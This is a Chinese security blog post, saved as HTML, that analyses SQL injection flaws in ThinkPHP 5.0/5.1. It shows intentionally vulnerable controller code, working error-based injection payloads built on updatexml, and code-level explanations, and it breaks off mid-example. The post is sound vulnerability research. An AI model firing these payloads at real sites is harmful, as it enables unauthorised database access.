@@ -1,0 +1,491 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="theme-color" content="#123456"><meta name="generator" content="Hexo 4.2.0"><title>Thinkphp5_x（不包含反序列化） - BeautyFlower</title><link rel="manifest" href="/manifest.json"><meta name="theme-color" content="#3273dc"><meta name="application-name" content="Icaurs - Hexo Theme"><meta name="msapplication-TileImage" content="icons/touch-icon-iphone.png"><meta name="msapplication-TileColor" content="#3273dc"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Icaurs - Hexo Theme"><meta name="apple-mobile-web-app-status-bar-style" content="default"><link rel="apple-touch-icon" sizes="144x144" href="icons/touch-icon-iphone.png"><link rel="apple-touch-icon" sizes="152x152" href="icons/touch-icon-ipad.png"><link rel="apple-touch-icon" sizes="72x72" href="icon/logo.ico"><link rel="apple-touch-icon" sizes="96x96" href="icon/logo.ico"><link rel="apple-touch-icon" sizes="128x128" href="icon/logo.ico"><link rel="apple-touch-icon" sizes="256x256" href="icon/logo.ico"><meta name="description" content="Thinkphp5_x（不包含反序列化）参考链接：https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;lu2ker&amp;#x2F;PHP-Code"><meta property="og:type" content="blog"><meta property="og:title" content="Thinkphp5_x（不包含反序列化）"><meta property="og:url" content="http://example.com/post/96d74354.html"><meta property="og:site_name" content="BeautyFlower"><meta property="og:description" content="Thinkphp5_x（不包含反序列化）参考链接：https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;lu2ker&amp;#x2F;PHP-Code"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://example.com/img/article/4.png"><meta property="article:published_time" content="2024-03-03T06:10:23.000Z"><meta property="article:modified_time" content="2024-09-28T16:17:20.000Z"><meta property="article:author" content="yyyyyyxnp"><meta property="article:tag" content="php"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="http://example.com/img/article/4.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/post/96d74354.html"},"headline":"Thinkphp5_x（不包含反序列化）","image":["http://example.com/img/article/4.png"],"datePublished":"2024-03-03T06:10:23.000Z","dateModified":"2024-09-28T16:17:20.000Z","author":{"@type":"Person","name":"yyyyyyxnp"},"publisher":{"@type":"Organization","name":"BeautyFlower","logo":{"@type":"ImageObject","url":{"text":"BeautyFlower"}}},"description":"Thinkphp5_x（不包含反序列化）参考链接：https:&#x2F;&#x2F;github.com&#x2F;lu2ker&#x2F;PHP-Code"}</script><link rel="canonical" href="http://example.com/post/96d74354.html"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
+  (function () {
+      function switchTab() {
+          if (!location.hash) {
+            return;
+          }
+
+          const id = '#' + CSS.escape(location.hash.substring(1));
+          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
+          if (!$tabMenu) {
+            return;
+          }
+
+          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
+          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
+          Array.from($tabMenuContainer.querySelectorAll('a'))
+              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
+              .forEach($content => $content.classList.add('is-hidden'));
+
+          if ($tabMenu) {
+              $tabMenu.parentElement.classList.add('is-active');
+          }
+          const $activeTab = document.querySelector(id);
+          if ($activeTab) {
+              $activeTab.classList.remove('is-hidden');
+          }
+      }
+      switchTab();
+      window.addEventListener('hashchange', switchTab, false);
+  })();
+  </script><!-- hexo injector head_end end --><link rel="alternate" href="/atom.xml" title="BeautyFlower" type="application/atom+xml">
+</head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">BeautyFlower</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/deng12yx"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><div class="card-image"><span class="image is-7by3"><img class="fill" src="/img/article/4.png" alt="Thinkphp5_x（不包含反序列化）"></span></div><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2024-03-03T06:10:23.000Z" title="2024/3/3 14:10:23">2024-03-03</time></span><span class="level-item">Updated&nbsp;<time dateTime="2024-09-28T16:17:20.000Z" title="2024/9/29 00:17:20">2024-09-29</time></span><span class="level-item"><a class="link-muted" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></span><span class="level-item">30 minutes read (About 4477 words)</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>&nbsp;visits</span></div></div><h1 class="title is-3 is-size-4-mobile">Thinkphp5_x（不包含反序列化）</h1><div class="content"><h4 id="Thinkphp5-x（不包含反序列化）"><a href="#Thinkphp5-x（不包含反序列化）" class="headerlink" title="Thinkphp5_x（不包含反序列化）"></a>Thinkphp5_x（不包含反序列化）</h4><p>参考链接：<a target="_blank" rel="noopener" href="https://github.com/lu2ker/PHP-Code">https://github.com/lu2ker/PHP-Code</a></p>
+<span id="more"></span>
+
+<h5 id="可能被利用的函数"><a href="#可能被利用的函数" class="headerlink" title="可能被利用的函数"></a>可能被利用的函数</h5><h6 id="array-search"><a href="#array-search" class="headerlink" title="array_search()"></a>array_search()</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_search</span> ( <span class="keyword">mixed</span> <span class="variable">$needle</span> , <span class="keyword">array</span> <span class="variable">$haystack</span> , <span class="keyword">bool</span> <span class="variable">$strict</span>=<span class="literal">false</span> ) <span class="comment"># 在数组中搜索给定值，如果成功则返回第一个对应的键。</span></span><br></pre></td></tr></table></figure>
+
+<p> 如果第三个参数没有主动设置为true(默认为false)，则有绕过的可能性。</p>
+<p>如果为false则进行弱比较匹配（不比较类型），意味着 PHP 会在进行比较时进行弱类型转换。在某些情况下，这种类型转换可能会导致意外的结果，从而引发漏洞。</p>
+<p>例如，在某些情况下，<code>array_search()</code> 可能会在搜索字符串时将字符串与数字进行比较。如果字符串的内容可以被解释为数字，则 PHP 将尝试将其转换为数字，并将其视为相等。这种行为可能被恶意利用，导致安全漏洞。</p>
+<h6 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">in_array</span> ( <span class="keyword">mixed</span> <span class="variable">$needle</span> , <span class="keyword">array</span> <span class="variable">$haystack</span> , <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">false</span> ) : <span class="keyword">bool</span>  <span class="comment">#检查数组中是否存在某个值</span></span><br></pre></td></tr></table></figure>
+
+<p>当in_array()函数的第三个参数未设置为true时（默认为false），会进行弱比较，可能会引发漏洞</p>
+<h6 id="filter-var"><a href="#filter-var" class="headerlink" title="filter_var()"></a>filter_var()</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">filter_var</span>( <span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$filter</span> = FILTER_DEFAULT, <span class="keyword">array</span>|<span class="keyword">int</span> <span class="variable">$options</span> = <span class="number">0</span>) : <span class="keyword">mixed</span> <span class="comment"># 使用特定的过滤器过滤一个变量。</span></span><br></pre></td></tr></table></figure>
+
+<p><code>FILTER_VALIDATE_URL</code> 过滤器把<code>$value</code>作为 URL 来验证，验证其是否是URL格式的字符串，但是有一个很大的问题是 这个过滤器的”宽容性很高“，类似于<code>qwe://</code>这种形式的URL都可以通过它的过滤。</p>
+<p>经过一些测试发现，形如<code>xxx://xxx</code>即可验证通过该过滤器。但是如果前半部分是<code>http://</code>的话，正斜杠后边不允许有特殊字符了。比如<code>http://&gt;&lt;&quot;&quot;;&#39;&#39;</code>是不行的但是<code>qwe://&gt;&lt;&quot;&quot;;&#39;&#39;</code>确实可以通过过滤的。</p>
+<h6 id="class-exists"><a href="#class-exists" class="headerlink" title="class_exists()"></a>class_exists()</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">class_exists</span> ( <span class="keyword">string</span> <span class="variable">$class</span> , <span class="keyword">bool</span> <span class="variable">$autoload</span> = <span class="literal">true</span> ) : <span class="keyword">bool</span> <span class="comment"># 检查指定的类是否已定义。$autoload是是否默认调用__autoload函数。</span></span><br></pre></td></tr></table></figure>
+
+<p>自动包含漏洞，可以使用<code>../</code>路径穿越来实现任意文件包含。但是，只有在<strong>PHP5~5.3（含）中才可以在<code>class_exists()</code>中传入<code>../</code>达到目的，高版本php中向<code>class_exists</code>中传入<code>../</code>是不会调用</strong><code>__autoload()</code>的。</p>
+<h6 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">strpos</span> ( <span class="keyword">string</span> <span class="variable">$haystack</span> , <span class="keyword">mixed</span> <span class="variable">$needle</span> , <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span> ) : <span class="keyword">int</span> <span class="comment"># 返回 needle 在 haystack 中首次出现的数字位置。如果提供了$offset，搜索会从字符串该字符数的起始位置开始统计。如果是负数，搜索会从字符串结尾指定字符数开始。</span></span><br></pre></td></tr></table></figure>
+
+<p>返回的是int而不是bool，因此如果数字位置是0则效果和false一样</p>
+<h6 id="escapeshellarg-和escapeshellcmd"><a href="#escapeshellarg-和escapeshellcmd" class="headerlink" title="escapeshellarg()和escapeshellcmd()"></a>escapeshellarg()和escapeshellcmd()</h6><p>…</p>
+<h4 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h4><h6 id="composer安装"><a href="#composer安装" class="headerlink" title="composer安装"></a>composer安装</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -sS https://getcomposer.org/installer | php</span><br><span class="line">mv composer.phar /usr/local/bin/composer</span><br><span class="line">composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/  </span><br></pre></td></tr></table></figure>
+
+<h5 id="sql1"><a href="#sql1" class="headerlink" title="sql1"></a>sql1</h5><h6 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h6><p>thinkphp5.0.15下载</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=5.0.15 tp5</span><br></pre></td></tr></table></figure>
+
+<p>修改composer.json文件</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.4.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.0.15&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>同目录下执行<code>composer update</code></p>
+<h6 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">db</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">insert</span>([<span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/public/index.php/index/index?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,database(),0x7e),1)&amp;username[2]=1</span><br></pre></td></tr></table></figure>
+
+<h6 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h6><p>从代码本身上应该是获取username参数然后插入到数据库中，最后返回更新成功结果</p>
+<img src="/post/96d74354/image-20240304140856119.png" alt="image-20240304140856119" style="zoom:33%;">
+
+<p>先随便传入一个参数分析代码执行过程</p>
+<p>首先是调用get方法，如果this-&gt;get参数为空就将获取到的get参数传递给this-&gt;get，然后判断name是否为数组，这里的name不是数组，会进入到下面的input函数</p>
+<img src="/post/96d74354/image-20240304141537693.png" alt="image-20240304141537693" style="zoom:33%;">
+
+<p>在该函数中，将username按照了&#x2F;进行分割，name为username，type为a</p>
+<img src="/post/96d74354/image-20240304141630796.png" alt="image-20240304141630796" style="zoom:33%;">
+
+<p>在下面代码中进行了类型检查和强制数组类型转换，各type含义如下：<img src="/post/96d74354/image-20210831142915046.png" alt="image-20210831142915046" style="zoom: 25%;"></p>
+<img src="/post/96d74354/image-20240304141851612.png" alt="image-20240304141851612" style="zoom:50%;">
+
+<p>由此返回的username参数就是get获取到的参数的数组形式</p>
+<img src="/post/96d74354/image-20240304142040564.png" alt="image-20240304142040564" style="zoom:33%;">
+
+<p>然后进入数据库的插入函数，data进行了合并数组，结果还是之前的[username:[“hello”]]，这里我发现返回的sql结果是0，进入该函数分析</p>
+<img src="/post/96d74354/image-20240304142457991.png" alt="image-20240304142457991" style="zoom:33%;">
+
+<p>查看这里的insert函数，首先进行了解析数据，这里data就直接返回空了，查看该函数</p>
+<img src="/post/96d74354/image-20240304142712277.png" alt="image-20240304142712277" style="zoom:33%;">
+
+<p>这里的val就是data转换为list形式，没有键，即[“hello”]，因此此处的比较无法通过，最后返回的就是空</p>
+<img src="/post/96d74354/image-20240304142959506.png" alt="image-20240304142959506" style="zoom:33%;">
+
+<p>因此重新传入危险参数，再次调试到该步</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1</span><br></pre></td></tr></table></figure>
+
+<p>此时的val就是长度为3的数组，第二个参数是很常见的报错注入</p>
+<img src="/post/96d74354/image-20240304143310307.png" alt="image-20240304143310307" style="zoom: 50%;">
+
+<p>传递后的结果如图所示，主要是此处的<strong>parseKey没有对变量值进行有效过滤</strong></p>
+<img src="/post/96d74354/image-20240304143438165.png" alt="image-20240304143438165" style="zoom: 25%;">
+
+<p>最后返回的结果相当于把username作为的是列名字，后面的参数是要插入的值，最后返回的sql语句如下</p>
+<img src="/post/96d74354/image-20240304143624757.png" alt="image-20240304143624757" style="zoom: 25%;">
+
+<p>因此引发报错注入，会显示用户</p>
+<img src="/post/96d74354/image-20240304143930652.png" alt="image-20240304143930652" style="zoom:50%;">
+
+<h5 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h5><h6 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h6><p>thinkphp5.0.15下载</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.1.0 tpdemo</span><br></pre></td></tr></table></figure>
+
+<p>修改composer.json文件</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.6.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.1.7&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>同目录下执行<code>composer update</code></p>
+<h6 id="测试代码-1"><a href="#测试代码-1" class="headerlink" title="测试代码"></a>测试代码</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">db</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>([<span class="string">&#x27;id&#x27;</span> =&gt; <span class="number">1</span>])-&gt;<span class="title function_ invoke__">update</span>([<span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>]);</span><br><span class="line">        <span class="comment">// db(&#x27;users&#x27;)-&gt;insert([&#x27;username&#x27; =&gt; $username]);  上一份测试代码</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/public/?username[0]=point&amp;username[1]=1&amp;username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]=0</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h6><p>通过观察可以看到前面获取username方法是一样的，主要分析此处的where函数，但从该语句的格式应该是更新id为1处的username为获取到的参数</p>
+<p>用payload进行调试，可以看到此时的this就是传入的参数的内容</p>
+<img src="/post/96d74354/image-20240304164237002.png" alt="image-20240304164237002" style="zoom: 25%;">
+
+
+
+<p>那sql代码的执行应该就是在下面的update函数里面，通过查看该函数内容，可以看到sql语句生成过程</p>
+<img src="/post/96d74354/image-20240304164459903.png" alt="image-20240304164459903" style="zoom:33%;">
+
+<p>在此处的parsedata应该就是对传入的username进行过滤清洗转换为可用形式</p>
+<img src="/post/96d74354/image-20240304164641551.png" alt="image-20240304164641551" style="zoom:33%;">
+
+<p>在parseData函数里面的parseArrayData就是清洗的具体函数，用于解析数组形式的数据并返回相应的数据库查询语句片段，首先获取data的第一二个参数给type和value，fun是第三个参数，point是第四个参数，然后进行重新组合，会生成类似于 <code>&#39;GeomFromText(&#39;POINT(x y)&#39;)&#39;</code> 的字符串。而该函数本身的用意是将坐标 <code>(x, y)</code> 转换成几何点的 MySQL 函数调用，在此处我们通过构造poc替代这里的函数，使得最后生成的函数是我们的报错注入的内容</p>
+<img src="/post/96d74354/image-20240304164943983.png" alt="image-20240304164943983" style="zoom:25%;">
+
+<p>生成result之后后面就会拼接成sql语句，然后执行，最后实现报错注入</p>
+<img src="/post/96d74354/image-20240304165616979.png" alt="image-20240304165616979" style="zoom: 25%;">
+
+<h5 id="sql3"><a href="#sql3" class="headerlink" title="sql3"></a>sql3</h5><h6 id="环境-2"><a href="#环境-2" class="headerlink" title="环境"></a>环境</h6><p>thinkphp5.0.10下载</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.0.10 tpdemo</span><br></pre></td></tr></table></figure>
+
+<p>修改composer.json文件</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.4.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.0.10&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>
+
+<p>同目录下执行<code>composer update</code></p>
+<h6 id="测试代码-2"><a href="#测试代码-2" class="headerlink" title="测试代码"></a>测试代码</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">db</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;exp&#x27;</span>,<span class="variable">$username</span>)-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">        <span class="comment">// $username = request()-&gt;get(&#x27;username/a&#x27;);</span></span><br><span class="line">        <span class="comment">// db(&#x27;users&#x27;)-&gt;where([&#x27;id&#x27; =&gt; 1])-&gt;update([&#x27;username&#x27; =&gt; $username]);  上一份代码</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;select success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/public/index.php?username==updatexml(1,concat(0x7,database(),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h6><p>首先看到此处已经不是username&#x2F;a，说明可能强制数组类型转换，先随便传入参数进行调试分析，有此处看到由于前面传入的没有&#x2F;a，所以此处type会被设置为s，s是强制转换为字符串类型</p>
+<img src="/post/96d74354/image-20240304171009653.png" alt="image-20240304171009653" style="zoom:33%;">
+
+<p>下面返回之前进行强制字符串类型转换，该处的data就是返回的username</p>
+<img src="/post/96d74354/image-20240304171137773.png" alt="image-20240304171137773" style="zoom:33%;">
+
+<p>接着分析第二段代码</p>
+<img src="/post/96d74354/image-20240304171300752.png" alt="image-20240304171300752" style="zoom:33%;">
+
+<p>这是前面流程基本一致，这是生成的sql函数</p>
+<img src="/post/96d74354/image-20240304171700471.png" alt="image-20240304171700471" style="zoom:33%;">
+
+<p>此处就是单纯对sql语句进行了拼接，应该没有检查，通过添加等号就可以看到可以成功执行了</p>
+<img src="/post/96d74354/image-20240304172025040.png" alt="image-20240304172025040" style="zoom:33%;">
+
+<p>因此还是可以通过报错注入做</p>
+<img src="/post/96d74354/image-20240304172147665.png" alt="image-20240304172147665" style="zoom:33%;">
+
+<h5 id="sql4"><a href="#sql4" class="headerlink" title="sql4"></a>sql4</h5><h6 id="环境-3"><a href="#环境-3" class="headerlink" title="环境"></a>环境</h6><p>thinkphp5.0.10下载</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.0.10 tpdemo</span><br></pre></td></tr></table></figure>
+
+<p>修改composer.json文件</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.4.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.0.10&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>
+
+<p>同目录下执行<code>composer update</code></p>
+<h6 id="测试代码-3"><a href="#测试代码-3" class="headerlink" title="测试代码"></a>测试代码</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span 